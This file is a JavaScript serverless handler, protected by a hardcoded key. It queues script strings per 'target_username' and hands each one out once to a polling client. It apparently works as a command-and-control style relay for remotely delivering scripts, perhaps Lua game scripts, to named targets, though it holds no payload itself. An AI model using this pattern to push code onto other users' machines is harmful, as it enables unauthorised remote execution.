let scriptsQueue = [];
const SECRET_KEY = "LMAOXD_Key768675";

export default async function handler(req, res) {
    const body = req.body || {};
    const key = body.LMAOXD_Key768675 || req.query.LMAOXD_Key768675;
    const targetUsername = body.target_username;

    if (key !== SECRET_KEY) {
        return res.status(401).json({ error: "Unauthorized" });
    }

    // POST: add script for a username
    if (req.method === "POST") {
        const script = body.script || "--none";
        if (!targetUsername) return res.status(400).json({ error: "target_username required" });
        scriptsQueue.push({ targetUsername, script });
        return res.status(200).json({ status: "queued" });
    }

    // GET: return script for specific username
    if (req.method === "GET") {
        if (!targetUsername) return res.status(400).json({ error: "target_username required" });
        const index = scriptsQueue.findIndex(s => s.targetUsername === targetUsername);
        if (index === -1) return res.status(200).send("--none");
        const scriptToSend = scriptsQueue[index].script;
        scriptsQueue.splice(index, 1); // remove after sending
        return res.status(200).send(scriptToSend);
    }

    return res.status(405).json({ error: "Method Not Allowed" });
}
